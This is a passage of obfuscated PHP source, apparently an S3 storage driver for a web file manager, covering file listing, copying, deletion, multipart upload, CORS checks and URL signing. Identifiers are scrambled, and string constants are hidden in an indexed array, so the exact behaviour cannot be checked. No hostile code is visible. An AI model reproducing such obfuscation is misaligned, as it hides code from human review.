(substr($ã¯ô·Î¿, -1) == $–„ºñüó[8]) { $‡Ñ×ó· = rtrim($‡Ñ×ó·, $–„ºñüó[8]) . $–„ºñüó[8]; } $—«¸÷ = array_merge($—«¸÷, $this->slicePath($‡Ñ×ó·)); } $ãâ¥‹¼ = array(); foreach (array_unique($—«¸÷) as $å»¢Ê´ş) { $âëˆÛı’ = array($–„ºñüó[87] => $this->getPathOuter($–„ºñüó[8] . $ÂœØíÊŒ . $–„ºñüó[8] . $å»¢Ê´ş), $–„ºñüó[78] => 1, $–„ºñüó[79] => 0); if (substr($å»¢Ê´ş, -1) != $–„ºñüó[8]) { $âëˆÛı’[$–„ºñüó[78]] = 0; $„«˜Ô¥ğ = $this->getPath($ÂœØíÊŒ . $–„ºñüó[8] . $å»¢Ê´ş); if (isset($üåá–Éœ[$„«˜Ô¥ğ])) { $¨ä‘áµ÷ = $üåá–Éœ[$„«˜Ô¥ğ]; if (isset($¨ä‘áµ÷[$–„ºñüó[79]])) { $âëˆÛı’[$–„ºñüó[79]] = intval($¨ä‘áµ÷[$–„ºñüó[79]]); } if (isset($¨ä‘áµ÷[$–„ºñüó[206]])) { $âëˆÛı’[$–„ºñüó[88]] = intval($¨ä‘áµ÷[$–„ºñüó[206]]); } } } $ãâ¥‹¼[] = $âëˆÛı’; } return $ãâ¥‹¼; } public function slicePath($ã¯Ôîèò) { $Ï¼˜µ‚ =& $_SERVER[ˆ¡¹µ‹Â]; $›Éš·«÷ = explode($Ï¼˜µ‚[8], trim($ã¯Ôîèò, $Ï¼˜µ‚[8])); $‚ÑûŞ¦ó = 0; do { ++$‚ÑûŞ¦ó; $Šöëä¿‰[] = implode($Ï¼˜µ‚[8], array_slice($›Éš·«÷, 0, $‚ÑûŞ¦ó)) . $Ï¼˜µ‚[8]; } while ($‚ÑûŞ¦ó < count($›Éš·«÷)); $Šöëä¿‰[count($›Éš·«÷) - 1] = $ã¯Ôîèò; return $Šöëä¿‰; } public function getHost() { $’Ú¸”Óê =& $_SERVER[ˆ¡¹µ‹Â]; $ÇÊèŞÄ = parse_url(trim($this->domain, $’Ú¸”Óê[8])); $Æ÷¹”ï™ = isset($ÇÊèŞÄ[$’Ú¸”Óê[207]]) ? $ÇÊèŞÄ[$’Ú¸”Óê[207]] : http_type(); $„º„ƒ€ó = isset($ÇÊèŞÄ[$’Ú¸”Óê[208]]) ? $ÇÊèŞÄ[$’Ú¸”Óê[208]] : $ÇÊèŞÄ[$’Ú¸”Óê[87]]; if (isset($ÇÊèŞÄ[$’Ú¸”Óê[209]])) { $„º„ƒ€ó .= $’Ú¸”Óê[4] . $ÇÊèŞÄ[$’Ú¸”Óê[209]]; } return $Æ÷¹”ï™ . $’Ú¸”Óê[210] . $„º„ƒ€ó; } public function pathEncode($ÛñÁŠÀ) { $¶İ¬õŒ£ =& $_SERVER[ˆ¡¹µ‹Â]; return str_replace($¶İ¬õŒ£[211], $¶İ¬õŒ£[8], rawurlencode($ÛñÁŠÀ)); } public function writeLog($¼ßÚ…ı¸ = '', $ÎŞ—ŠÍ™ = false) { $Î¡Ÿ´êŞ =& $_SERVER[ˆ¡¹µ‹Â]; $¼·ÒÜï = in_array(ACTION, array($Î¡Ÿ´êŞ[212], $Î¡Ÿ´êŞ[213])); if (!$¼·ÒÜï && !GLOBAL_DEBUG) { return; } $Îˆà‘¾´ = $¼ßÚ…ı¸; static $ÚÒ¤ß™â = null; if (!$ÚÒ¤ß™â) { $ÚÒ¤ß™â = strtoupper($this->getType()); } $¼ßÚ…ı¸ = $ÚÒ¤ß™â . $Î¡Ÿ´êŞ[214] . $¼ßÚ…ı¸; if ($ÎŞ—ŠÍ™) { $•¼öœ = error_get_last(); if ($•¼öœ) { $¼ßÚ…ı¸ = array($¼ßÚ…ı¸, $•¼öœ); } } write_log($¼ßÚ…ı¸, $Î¡Ÿ´êŞ[215]); if ($¼·ÒÜï) { throw new Exception($Îˆà‘¾´); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¿Ããñ) { set_timeout(); require_once SDK_DIR . $_SERVER[ˆ¡¹µ‹Â][216]; parent::__construct(); $this->_init($¿Ããñ); } public function _init($ŠÛìÉÈü) { $íú©ğ–Œ =& $_SERVER[ˆ¡¹µ‹Â]; $this->config = $ŠÛìÉÈü; foreach ($ŠÛìÉÈü as $ş‘œäí => $¶œØ¹•…) { if (isset($this->{$ş‘œäí})) { $this->{$ş‘œäí} = $¶œØ¹•…; } } $this->endpoint = $ŠÛìÉÈü[$íú©ğ–Œ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($íú©ğ–Œ[212], $íú©ğ–Œ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($Ö °¯ïî = "\166\x34") { $this->signVer = $Ö °¯ïî; $this->client->setSignatureVersion($Ö °¯ïî); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ğ±Ô¨«) { return null; } } public function isBucketCors() { $Â¿¾‡‡¬ =& $_SERVER[ˆ¡¹µ‹Â]; $’£—­›ğ = $this->getBucketCors(); if (!$’£—­›ğ || !is_array($’£—­›ğ)) { return !1; } if (!is_array($’£—­›ğ[$Â¿¾‡‡¬[218]])) { $’£—­›ğ[$Â¿¾‡‡¬[218]] = explode($Â¿¾‡‡¬[50], $’£—­›ğ[$Â¿¾‡‡¬[218]]); } if ($’£—­›ğ[$Â¿¾‡‡¬[219]] != $Â¿¾‡‡¬[220] || !in_array($Â¿¾‡‡¬[220], $’£—­›ğ[$Â¿¾‡‡¬[218]])) { return !1; } $Ó­¸¬Ê’ = array_map($Â¿¾‡‡¬[221], $’£—­›ğ[$Â¿¾‡‡¬[222]]); if (!is_array($Ó­¸¬Ê’)) { $Ó­¸¬Ê’ = array(); } $Ñ¯½¨¦ = array($Â¿¾‡‡¬[223], $Â¿¾‡‡¬[224], $Â¿¾‡‡¬[225], $Â¿¾‡‡¬[226], $Â¿¾‡‡¬[227]); $ØÊªéÄ¡ = array_diff($Ñ¯½¨¦, $Ó­¸¬Ê’); return empty($ØÊªéÄ¡); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($Ü¶‹ö¨‹, $ä‘ú×¨ = '', $¤è¿éÌÁ = REPEAT_RENAME) { $ß¨ÆØÈ  = $this->setContent($Ü¶‹ö¨‹, $ä‘ú×¨); if ($ß¨ÆØÈ  !== !1) { return $this->getPathOuter($Ü¶‹ö¨‹); } return !1; } public function mkdir($Í³ÉÁß, $©¾Û®¶Æ = REPEAT_SKIP) { $®üÉä¿• =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($Í³ÉÁß) && $Í³ÉÁß !== $®üÉä¿•[228]) { return !1; } if ($©¾Û®¶Æ && $this->_isFolder($Í³ÉÁß)) { return $this->getPathOuter($Í³ÉÁß); } $’ö©§ñ = $this->setContent($Í³ÉÁß, $®üÉä¿•[12], !0); if ($’ö©§ñ !== !1) { return $this->getPathOuter($Í³ÉÁß); } return !1; } public function copyFile($»¢ÜË±, $ë•Í”±, $¦®ÁÜ­Â = array()) { $’Ù¢ïÔ =& $_SERVER[ˆ¡¹µ‹Â]; $“Ï§Ü‘¶ = $this->objectMeta($»¢ÜË±); if (!$“Ï§Ü‘¶) { return !1; } if ($“Ï§Ü‘¶[$’Ù¢ïÔ[79]] <= 1024 * 1024 * 200) { $ŞßŒ¸à = $this->client->copyObject($this->bucket, $»¢ÜË±, $this->bucket, $ë•Í”±, $’Ù¢ïÔ[229], $¦®ÁÜ­Â); } else { $ŞßŒ¸à = $this->client->multiCopyObject($this->bucket, $»¢ÜË±, $this->bucket, $ë•Í”±, $¦®ÁÜ­Â); } $ŞßŒ¸à = $ŞßŒ¸à ? $this->getPathOuter($ë•Í”±) : !1; return $ŞßŒ¸à; } public function moveFile($”ºå¾ã, $áƒ¶øÖ) { if ($this->copyFile($”ºå¾ã, $áƒ¶øÖ)) { $this->delFile($”ºå¾ã); return $this->getPathOuter($áƒ¶øÖ); } return !1; } public function delFile($³ŒÎÆ­ï) { return $this->client->deleteObject($this->bucket, $³ŒÎÆ­ï); } public function delFolder($ùÕ¥ã‡‹) { $™º°€¿‰ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->exist($ùÕ¥ã‡‹)) { return !0; } $this->listItemCache = !1; $‹ºåùÚé = $this->fileList($ùÕ¥ã‡‹); $this->listItemCache = !0; $¥úÍŞúÃ = trim($ùÕ¥ã‡‹, $™º°€¿‰[8]) . $™º°€¿‰[8]; if (!empty($ùÕ¥ã‡‹) && $ùÕ¥ã‡‹ !== $™º°€¿‰[228] && !in_array($¥úÍŞúÃ, $‹ºåùÚé[$™º°€¿‰[85]])) { $‹ºåùÚé[$™º°€¿‰[85]][] = $¥úÍŞúÃ; } $Äàª–ôÍ = $this->delByBatch($‹ºåùÚé[$™º°€¿‰[86]]); if (!$Äàª–ôÍ) { return !1; } $Äàª–ôÍ = $this->delByBatch($‹ºåùÚé[$™º°€¿‰[85]]); if (!$Äàª–ôÍ) { return !1; } return $this->delFile($¥úÍŞúÃ); } private function delByBatch($æØ¨œã÷) { foreach (array_chunk($æØ¨œã÷, 1000) as $»ñË¨ğ¸) { $¹‰È¼ÏÛ = $this->client->deleteObjects($this->bucket, $»ñË¨ğ¸); if (!$¹‰È¼ÏÛ) { return !1; } } return !0; } public function rename($´õêôİæ, $ÅÁ’Ù•ø) { return $this->renameObject($´õêôİæ, $ÅÁ’Ù•ø); } public function listPath($è©Œ¢¼, $„Óâ«Şë = false) { $œ¦¶Èï =& $_SERVER[ˆ¡¹µ‹Â]; $í£õÁøã = $this->fileList($è©Œ¢¼, $œ¦¶Èï[8], !0); foreach ($í£õÁøã[$œ¦¶Èï[85]] as $Ìã±ĞšÔ => $ˆ‚»Ñô®) { $í£õÁøã[$œ¦¶Èï[85]][$Ìã±ĞšÔ] = $this->folderInfo($ˆ‚»Ñô®, $„Óâ«Şë, $ˆ‚»Ñô®); } foreach ($í£õÁøã[$œ¦¶Èï[86]] as $Ìã±ĞšÔ => $ˆ‚»Ñô®) { $í£õÁøã[$œ¦¶Èï[86]][$Ìã±ĞšÔ] = $this->fileInfo($ˆ‚»Ñô®[$œ¦¶Èï[32]], $„Óâ«Şë, $ˆ‚»Ñô®); } return $í£õÁøã; } protected function infoChildren($×¾°Çäï, &$ÚÅ§£€È) { $ø‘ñÎ®› =& $_SERVER[ˆ¡¹µ‹Â]; $ù ÜÂê = $this->fileList($×¾°Çäï, $ø‘ñÎ®›[12], !0); $ÚÅ§£€È[$ø‘ñÎ®›[81]] += count($ù ÜÂê[$ø‘ñÎ®›[85]]); $ÚÅ§£€È[$ø‘ñÎ®›[80]] += count($ù ÜÂê[$ø‘ñÎ®›[86]]); foreach ($ù ÜÂê[$ø‘ñÎ®›[86]] as $×ÚÆ‹Ë) { if (!$×ÚÆ‹Ë || !$×ÚÆ‹Ë[$ø‘ñÎ®›[79]]) { continue; } $ÚÅ§£€È[$ø‘ñÎ®›[79]] += $×ÚÆ‹Ë[$ø‘ñÎ®›[79]]; } } private function fileInfo($êÈ˜Á¥, $¼ŞØ¡Éœ = false, $ƒÀÜ‡ôÁ = array()) { $à¢Î¿´¯ =& $_SERVER[ˆ¡¹µ‹Â]; $¨´Ç¢ü = array($à¢Î¿´¯[32] => $this->pathThis($êÈ˜Á¥), $à¢Î¿´¯[87] => $this->getPathOuter($êÈ˜Á¥), $à¢Î¿´¯[33] => $à¢Î¿´¯[230], $à¢Î¿´¯[169] => $this->ext($êÈ˜Á¥), $à¢Î¿´¯[79] => isset($ƒÀÜ‡ôÁ[$à¢Î¿´¯[79]]) ? $ƒÀÜ‡ôÁ[$à¢Î¿´¯[79]] : 0); if ($¼ŞØ¡Éœ) { return $¨´Ç¢ü; } $¨´Ç¢ü[$à¢Î¿´¯[231]] = $¨´Ç¢ü[$à¢Î¿´¯[88]] = 0; $¨´Ç¢ü[$à¢Î¿´¯[232]] = $¨´Ç¢ü[$à¢Î¿´¯[233]] = !0; if (empty($ƒÀÜ‡ôÁ)) { $ƒÀÜ‡ôÁ = $this->objectMeta($êÈ˜Á¥); if (!$ƒÀÜ‡ôÁ) { return $¨´Ç¢ü; } } if (isset($ƒÀÜ‡ôÁ[$à¢Î¿´¯[234]]) && $ƒÀÜ‡ôÁ[$à¢Î¿´¯[234]]) { $¨´Ç¢ü[$à¢Î¿´¯[235]] = $ƒÀÜ‡ôÁ[$à¢Î¿´¯[234]]; } if (isset($ƒÀÜ‡ôÁ[$à¢Î¿´¯[206]])) { $¨´Ç¢ü[$à¢Î¿´¯[88]] = $ƒÀÜ‡ôÁ[$à¢Î¿´¯[206]]; } if (isset($ƒÀÜ‡ôÁ[$à¢Î¿´¯[79]])) { $¨´Ç¢ü[$à¢Î¿´¯[79]] = $ƒÀÜ‡ôÁ[$à¢Î¿´¯[79]]; } return $¨´Ç¢ü; } private function folderInfo($ƒ¯×à‹à, $Ÿşò©‰ = false, $Íª¹ÉÈß = array()) { $ÈÔõÂª« =& $_SERVER[ˆ¡¹µ‹Â]; $¶Ñ®·œ‡ = array($ÈÔõÂª«[32] => $this->pathThis($ƒ¯×à‹à), $ÈÔõÂª«[87] => $this->getPathOuter($ÈÔõÂª«[8] . $ƒ¯×à‹à), $ÈÔõÂª«[33] => $ÈÔõÂª«[78]); if ($Ÿşò©‰) { return $¶Ñ®·œ‡; } $¶Ñ®·œ‡[$ÈÔõÂª«[231]] = $¶Ñ®·œ‡[$ÈÔõÂª«[88]] = 0; $¶Ñ®·œ‡[$ÈÔõÂª«[232]] = $¶Ñ®·œ‡[$ÈÔõÂª«[233]] = !0; if ($ƒ¯×à‹à == $ÈÔõÂª«[12]) { return $¶Ñ®·œ‡; } if (empty($Íª¹ÉÈß)) { $Íª¹ÉÈß = $this->objectMeta(trim($ƒ¯×à‹à, $ÈÔõÂª«[8]) . $ÈÔõÂª«[8]); } if (isset($Íª¹ÉÈß[$ÈÔõÂª«[206]])) { $¶Ñ®·œ‡[$ÈÔõÂª«[231]] = $Íª¹ÉÈß[$ÈÔõÂª«[206]]; } return $¶Ñ®·œ‡; } private function fileList($„ÏƒÕ¸‘, $˜ö­š±– = '', $ŒòÛ‰…Á = 0) { $¿Õä³Š¨ =& $_SERVER[ˆ¡¹µ‹Â]; $àÑ½›…ß = rtrim($„ÏƒÕ¸‘, $¿Õä³Š¨[8]) . $¿Õä³Š¨[8]; $Š–ÆÙÇÅ = $this->listObjs($àÑ½›…ß, null, null, $˜ö­š±–); if (!$Š–ÆÙÇÅ) { return array($¿Õä³Š¨[85] => array(), $¿Õä³Š¨[86] => array()); } $åê ¼… = $¡¡ŸÙ• = array(); foreach ($Š–ÆÙÇÅ[$¿Õä³Š¨[236]] as $›±å°à—) { $»Ô‡²¯ = $›±å°à—[$¿Õä³Š¨[32]]; if ($»Ô‡²¯ == $àÑ½›…ß) { continue; } $ïÏĞ = isset($›±å°à—[$¿Õä³Š¨[79]]) ? $›±å°à—[$¿Õä³Š¨[79]] : 0; $ÄüÖ†€Ã = $ïÏĞ == 0 && substr($»Ô‡²¯, strlen($»Ô‡²¯) - 1, 1) == $¿Õä³Š¨[8] ? !0 : !1; $this->cacheMethodInfoSet($»Ô‡²¯, $ÄüÖ†€Ã, $›±å°à—); if ($ÄüÖ†€Ã) { $åê ¼…[] = $»Ô‡²¯; continue; } $¡¡ŸÙ•[] = $ŒòÛ‰…Á ? $›±å°à— : $»Ô‡²¯; } foreach ($Š–ÆÙÇÅ[$¿Õä³Š¨[237]] as $›±å°à—) { $åê ¼…[] = $›±å°à—[$¿Õä³Š¨[32]]; $this->cacheMethodInfoSet($›±å°à—[$¿Õä³Š¨[32]], !0); } $this->cacheMethodInfoSet($„ÏƒÕ¸‘, !0); return array($¿Õä³Š¨[85] => $åê ¼…, $¿Õä³Š¨[86] => $¡¡ŸÙ•); } private function listObjs($ÒôºÏ£î, $Ë‘’Ø£ = null, $£›Çöµû = null, $˜ğëş—à = null) { $ìË Òƒ“ =& $_SERVER[ˆ¡¹µ‹Â]; $ÒôºÏ£î = trim($ÒôºÏ£î, $ìË Òƒ“[8]); $ä˜Å»Ã = empty($ÒôºÏ£î) && $ÒôºÏ£î !== $ìË Òƒ“[228] ? $ìË Òƒ“[12] : $ÒôºÏ£î . $ìË Òƒ“[8]; return $this->client->getBucket($this->bucket, $ä˜Å»Ã, $Ë‘’Ø£, $£›Çöµû, $˜ğëş—à, !0); } public function has($şó°‘¼Ã, $•­íæÁ³ = false, $ßÀõ·Ä = true) { $€—áÙü½ =& $_SERVER[ˆ¡¹µ‹Â]; $şó°‘¼Ã = trim($şó°‘¼Ã, $€—áÙü½[8]); $ı…€ËÏÍ = empty($şó°‘¼Ã) && $şó°‘¼Ã !== $€—áÙü½[228] ? $€—áÙü½[12] : $şó°‘¼Ã . $€—áÙü½[8]; $×»‡ö› = null; $çÜÁŞ£õ = 500; $Ïœ±àÒĞ = $€—áÙü½[8]; $€ğ‹ÙüÃ = $ÔïÀ¨öê = array(); while (!0) { $ĞîÇÉƒ£ = $this->listObjs($şó°‘¼Ã, $×»‡ö›, $çÜÁŞ£õ, $Ïœ±àÒĞ); if (!$ĞîÇÉƒ£) { break; } $×»‡ö› = $ĞîÇÉƒ£[$€—áÙü½[238]]; $ÕÍ¹Ûş÷ = $ĞîÇÉƒ£[$€—áÙü½[236]]; $ø±ú ›€ = $ĞîÇÉƒ£[$€—áÙü½[237]]; if (empty($ÕÍ¹Ûş÷) && empty($ø±ú ›€)) { break; } if (count($ÕÍ¹Ûş÷) == 1 && $ÕÍ¹Ûş÷[0][$€—áÙü½[32]] == $ı…€ËÏÍ) { break; } if ($•­íæÁ³) { if (count($ÕÍ¹Ûş÷)) { $ÕÍ¹Ûş÷ = array_column($ÕÍ¹Ûş÷, $€—áÙü½[32]); $€ğ‹ÙüÃ = array_merge($€ğ‹ÙüÃ, $ÕÍ¹Ûş÷); } if (count($ø±ú ›€)) { $ø±ú ›€ = array_column($ø±ú ›€, $€—áÙü½[32]); $ÔïÀ¨öê = array_merge($ÔïÀ¨öê, $ø±ú ›€); } if ($×»‡ö› === null) { break; } continue; } if ($ßÀõ·Ä) { if (!empty($ÕÍ¹Ûş÷)) { if (count($ÕÍ¹Ûş÷) > 1 || isset($ÕÍ¹Ûş÷[0][$€—áÙü½[32]]) && $ÕÍ¹Ûş÷[0][$€—áÙü½[32]] != $ı…€ËÏÍ) { return !0; } } } else { if (!empty($ø±ú ›€)) { return !0; } } if ($×»‡ö› === null) { break; } } if ($•­íæÁ³) { $€ğ‹ÙüÃ = array_diff($€ğ‹ÙüÃ, array($ı…€ËÏÍ)); $€ğ‹ÙüÃ = count(array_unique($€ğ‹ÙüÃ)); $ÔïÀ¨öê = count(array_unique($ÔïÀ¨öê)); return array($€—áÙü½[239] => $€ğ‹ÙüÃ, $€—áÙü½[240] => $ÔïÀ¨öê); } return !1; } public function listAll($ÔğÚøÁÅ) { $Ìíç‡í =& $_SERVER[ˆ¡¹µ‹Â]; $ç«„‚Ÿã = $this->fileList($ÔğÚøÁÅ, $Ìíç‡í[12], !0); $„ç¯ŸÃ = array_to_keyvalue($ç«„‚Ÿã[$Ìíç‡í[86]], $Ìíç‡í[32]); foreach ($ç«„‚Ÿã[$Ìíç‡í[85]] as $ò¾Ç÷Ëˆ) { if (is_string($ò¾Ç÷Ëˆ)) { $„ç¯ŸÃ[$ò¾Ç÷Ëˆ] = array($Ìíç‡í[79] => 0); } } return $this->listAllFiles($ÔğÚøÁÅ, $„ç¯ŸÃ); } public function canRead($›ˆ« ³) { $­œü¶ÇÃ =& $_SERVER[ˆ¡¹µ‹Â]; $èÜä”–Å = $this->client->getAccessControlPolicy($this->bucket, $›ˆ« ³); if (!$èÜä”–Å) { return !1; } return in_array($èÜä”–Å, array($­œü¶ÇÃ[241], $­œü¶ÇÃ[242], $­œü¶ÇÃ[243])) ? !0 : !1; } public function canWrite($íù›µêƒ) { $×şËÉç« =& $_SERVER[ˆ¡¹µ‹Â]; $—ªæÀôå = $this->client->getAccessControlPolicy($this->bucket, $íù›µêƒ); if (!$—ªæÀôå) { return !1; } return in_array($—ªæÀôå, array($×şËÉç«[241], $×şËÉç«[242])) ? !0 : !1; } public function getContent($ºäèŞ‹) { return $this->client->getObject($this->bucket, $ºäèŞ‹); } public function setContent($µŒÉıûô, $Ô¹×ã¹á = '', $›ƒ÷Ş‹À = false) { $Åƒ’Íä  =& $_SERVER[ˆ¡¹µ‹Â]; $µŒÉıûô = $›ƒ÷Ş‹À ? trim($µŒÉıûô, $Åƒ’Íä [8]) . $Åƒ’Íä [8] : $µŒÉıûô; $ÌŠ¦ş»İ = get_file_mime(get_path_ext($µŒÉıûô)); $¢ˆÓ²Í€ = $this->client->putObject($Ô¹×ã¹á, $this->bucket, $µŒÉıûô, $Åƒ’Íä [229], array(), $ÌŠ¦ş»İ); if (!$¢ˆÓ²Í€) { return !1; } if ($›ƒ÷Ş‹À) { return !0; } return $¢ˆÓ²Í€ ? !0 : !1; } public function fileSubstr($ôå»æİï, $Ì‚°Ü„, $—’¯Ğû¥) { $–©˜â ¿ = $Ì‚°Ü„ + $—’¯Ğû¥ - 1; return $this->client->getObject($this->bucket, $ôå»æİï, array($_SERVER[ˆ¡¹µ‹Â][244] => "\142\x79\164\x65\163\x3d{$Ì‚°Ü„}\x2d{$–©˜â ¿}")); } public function upload($Ùğ¬Ü ¹, $†èÙÉ½, $ŞœÖ¯¤© = false, $ğŸååÔ = REPEAT_REPLACE) { $Œº–òê =& $_SERVER[ˆ¡¹µ‹Â]; $¬¸Ÿ‹ = array($Œº–òê[245] => @md5_file($†èÙÉ½)); $Ë†ùÈ–ü = array($Œº–òê[246] => get_file_mime(get_path_ext($Ùğ¬Ü ¹))); if (IO::size($†èÙÉ½) <= 1024 * 1024 * 200) { $Š»ì÷£æ = $this->client->putObjectFile($†èÙÉ½, $this->bucket, $Ùğ¬Ü ¹, $Œº–òê[229], $¬¸Ÿ‹, $Ë†ùÈ–ü); return !empty($Š»ì÷£æ) ? $this->getPathOuter($Ùğ¬Ü ¹) : !1; } $ƒø™ıö = $this->client->multiUploadObject($†èÙÉ½, $this->bucket, trim($Ùğ¬Ü ¹, $Œº–òê[8]), $¬¸Ÿ‹, $Ë†ùÈ–ü); return $ƒø™ıö ? $this->getPathOuter($Ùğ¬Ü ¹) : !1; } public function download($íüÖÎÖ€, $Ö˜ìçï») { if (!@is_dir($this->pathFather($Ö˜ìçï»)) && !IO::mkdir($this->pathFather($Ö˜ìçï»))) { return !1; } $¨âü’ÀÊ = $this->client->getObject($this->bucket, $íüÖÎÖ€, array(), $Ö˜ìçï»); return $¨âü’ÀÊ !== !1 ? $Ö˜ìçï» : !1; } public function link($Ï‹ÍµŸ¹, $™úãÔİÌ = array()) { $‹ŞÏ¶­» =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->signVer == $‹ŞÏ¶­»[247]) { return $this->client->getAuthenticatedURL($this->bucket, $Ï‹ÍµŸ¹, 3600 * 12, $™úãÔİÌ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Ï‹ÍµŸ¹, $‹ŞÏ¶­»[8]), 3600 * 12, $this->region, array(), !0, $™úãÔİÌ); } public function fileOut($¸ì®¨ƒ, $˜ÌşıÕÃ = false, $Õ›…ğÌ¶ = false, $ï¡ùü©Ø = '') { $¿“øÕİÀ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isFileOutServer()) { return $this->fileOutServer($¸ì®¨ƒ, $˜ÌşıÕÃ, $Õ›…ğÌ¶, $ï¡ùü©Ø); } if (!$Õ›…ğÌ¶) { $Õ›…ğÌ¶ = $this->pathThis($¸ì®¨ƒ); } $”êÕ¸œ = get_file_mime(get_path_ext($Õ›…ğÌ¶)); if ($”êÕ¸œ == $¿“øÕİÀ[248]) { return parent::fileOut($¸ì®¨ƒ, $˜ÌşıÕÃ, $Õ›…ğÌ¶, $ï¡ùü©Ø); } $ô¶ò‚ÌÏ = array($¿“øÕİÀ[249] => $”êÕ¸œ); if ($˜ÌşıÕÃ) { $ô¶ò‚ÌÏ[$¿“øÕİÀ[250]] = $¿“øÕİÀ[251] . rawurlencode($Õ›…ğÌ¶); } else { } $òÑ«é• = $this->link($¸ì®¨ƒ, $ô¶ò‚ÌÏ); $this->fileOutLink($òÑ«é•); } public function fileOutServer($ŞşØƒÍ, $“÷ÍÛÑ = false, $É¸ÉŸÅÊ = false, $­¾ÈÎ¾ = '') { parent::fileOut($ŞşØƒÍ, $“÷ÍÛÑ, $É¸ÉŸÅÊ, $­¾ÈÎ¾); } public function fileOutImageServer($é”ïæ°æ, $È›—âí = 250) { parent::fileOutImage($é”ïæ°æ, $È›—âí); } public function hashMd5($³éÒ¾•¸, $ÂÇ›¤Ëå = '') { $’Ô¿ĞêÆ = $this->objectMeta($³éÒ¾•¸); if (!$’Ô¿ĞêÆ) { return !1; } $ÂÇ›¤Ëå = $ÂÇ›¤Ëå ? $ÂÇ›¤Ëå : _get($’Ô¿ĞêÆ, $_SERVER[ˆ¡¹µ‹Â][252]); return $ÂÇ›¤Ëå; } public function uploadFormData($“†áá¡×, $ç–€‡« = 3600) { $ĞÊÛ½½Â =& $_SERVER[ˆ¡¹µ‹Â]; $ÒØ°ÒØ = $this->pathFather($“†áá¡×); $Ñ©ª¢ò = $this->client->getHttpUploadPostParams($this->bucket, $ÒØ°ÒØ, $ĞÊÛ½½Â[229], $ç–€‡«); return array_merge((array) $Ñ©ª¢ò, array($ĞÊÛ½½Â[208] => $this->getHost())); } public function multiUploadFormData($ö‚³Ã©, $ø’æÙ³ = 3600) { $¥ù–İêÕ =& $_SERVER[ˆ¡¹µ‹Â]; $å³ëüïç = gmdate($¥ù–İêÕ[253]); $…¿­øñ” = array(); $×í¨¼ = $this->client->getUploadId($this->bucket, $ö‚³Ã©, $…¿­øñ”); if (!$×í¨¼) { return !1; } return array($¥ù–İêÕ[254] => $×í¨¼, $¥ù–İêÕ[208] => $this->getHost() . $¥ù–İêÕ[8] . $this->pathEncode($ö‚³Ã©), $¥ù–İêÕ[255] => $å³ëüïç, $¥ù–İêÕ[97] => $ö‚³Ã©); } public function multiUploadAuthData($¯·“•¯’, $ø²ô„ã— = array()) { $³¯«”¼¬ =& $_SERVER[ˆ¡¹µ‹Â]; $æ¡çí£Î = isset($ø²ô„ã—[$³¯«”¼¬[255]]) ? $ø²ô„ã—[$³¯«”¼¬[255]] : gmdate($³¯«”¼¬[253]); $…¦Œºİ† = isset($ø²ô„ã—[$³¯«”¼¬[169]]) ? $ø²ô„ã—[$³¯«”¼¬[169]] : $³¯«”¼¬[12]; $‹ãëÃù = $ø²ô„ã—[$³¯«”¼¬[97]]; unset($ø²ô„ã—[$³¯«”¼¬[97]]); if (isset($ø²ô„ã—[$³¯«”¼¬[256]])) { $ø²ô„ã—[$³¯«”¼¬[255]] = $æ¡çí£Î; return $this->listUploadParts($‹ãëÃù, $ø²ô„ã—); } $„–”Õ®û = array($³¯«”¼¬[257], $³¯«”¼¬[12], $³¯«”¼¬[123], $³¯«”¼¬[12], "\x78\55\x61\x6d\x7a\55\144\x61\164\145\72{$æ¡çí£Î}", $³¯«”¼¬[8] . $this->bucket . $³¯«”¼¬[8] . $this->pathEncode($‹ãëÃù) . $…¦Œºİ†); if (strpos($…¦Œºİ†, $³¯«”¼¬[258]) === 0) { $„–”Õ®û[0] = $³¯«”¼¬[259]; } if (isset($ø²ô„ã—[$³¯«”¼¬[260]]) && $ø²ô„ã—[$³¯«”¼¬[260]] == $³¯«”¼¬[261]) { $„–”Õ®û[0] = $³¯«”¼¬[261]; } $¦‡šòâŸ = implode($³¯«”¼¬[262], $„–”Õ®û); $»Êí¾¿Ç = base64_encode(hash_hmac($³¯«”¼¬[263], $¦‡šòâŸ, $this->secret, !0)); $õäş³ŸĞ = $³¯«”¼¬[264] . $this->accessKey . $³¯«”¼¬[4] . $»Êí¾¿Ç; if (strpos($…¦Œºİ†, $³¯«”¼¬[258]) === 0) { return array($³¯«”¼¬[265] => $õäş³ŸĞ, $³¯«”¼¬[255] => $æ¡çí£Î); } return $õäş³ŸĞ; } public function listUploadParts($üà½ãñÎ, $š¸ÓÀì¤ = array()) { $‚™ ÊØŠ =& $_SERVER[ˆ¡¹µ‹Â]; $ªèÙÖº = str_replace($‚™ ÊØŠ[266], $‚™ ÊØŠ[12], $š¸ÓÀì¤[$‚™ ÊØŠ[169]]); $÷Ùä²Ä¹ = $this->client->listParts($this->bucket, $üà½ãñÎ, $ªèÙÖº); if (!$÷Ùä²Ä¹) { return !1; } unset($š¸ÓÀì¤[$‚™ ÊØŠ[256]], $š¸ÓÀì¤[$‚™ ÊØŠ[260]]); $š¸ÓÀì¤[$‚™ ÊØŠ[97]] = $üà½ãñÎ; $ü¬Çİá© = $this->multiUploadAuthData($üà½ãñÎ, $š¸ÓÀì¤); if (empty($ü¬Çİá©)) { return !1; } return array($‚™ ÊØŠ[265] => $ü¬Çİá©, $‚™ ÊØŠ[255] => $š¸ÓÀì¤[$‚™ ÊØŠ[255]], $‚™ ÊØŠ[267] => $÷Ùä²Ä¹); } public function getHost() { $ÇÏëŞ— =& $_SERVER[ˆ¡¹µ‹Â]; $´Ş°ó«û = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if 